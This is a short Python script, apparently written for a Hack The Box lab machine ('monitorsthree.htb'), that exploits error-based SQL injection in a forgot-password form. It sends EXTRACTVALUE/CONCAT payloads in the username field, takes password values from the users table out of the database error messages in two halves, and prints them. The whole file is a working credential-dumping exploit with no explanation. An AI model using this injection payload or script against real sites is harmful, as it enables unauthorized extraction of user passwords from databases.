import requests
import re
from bs4 import BeautifulSoup

def get_half(iterator,index=1):
    response=requests.post(url,data={
    "username":f"' AND EXTRACTVALUE(0, CONCAT(0x5c, (select substring(password,{index},{index+15}) from users limit {iterator},1)))-- -"
    },allow_redirects=True)
    soup=BeautifulSoup(response.text,'html.parser')
    shots = soup.find_all("div")
    error=shots[-2].text.rstrip()
    passwd=error[error.find(start)+9:-1]
    return passwd

url = "http://monitorsthree.htb/forgot_password.php"
passwords=[]
current_password=""
iterator=1
shots=""
start="error: '\\"
end="'"
for i in range(0,10):
    current_password=""
    current_password+=get_half(i)
    current_password+=get_half(i,17)
    if "Unable to process request, try again" in current_password:
        break
    passwords.append(current_password)
print("\n".join(passwords))
    


